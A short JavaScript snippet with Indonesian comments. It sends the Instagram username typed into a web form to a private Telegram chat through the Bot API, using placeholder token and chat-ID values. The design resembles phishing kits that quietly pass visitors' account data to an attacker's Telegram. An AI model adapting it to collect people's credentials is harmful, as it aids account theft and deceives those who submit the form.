document.getElementById("igForm").addEventListener("submit", function(event) {
    event.preventDefault();

    var username = document.getElementById("username").value;
    var telegramBotToken = "TOKEN_BOT";  // Ganti dengan token bot Anda
    var chatID = "ID_TELEGRAM_ANDA";  // Ganti dengan ID Telegram Anda
    var message = "Username Instagram: " + username;

    var telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    fetch(telegramURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatID, text: message })
    })
    .then(response => response.json())
    .then(data => {
        document.getElementById("message").innerText = "Username berhasil dikirim!";
    })
    .catch(error => {
        document.getElementById("message").innerText = "Terjadi kesalahan, coba lagi.";
    });
});
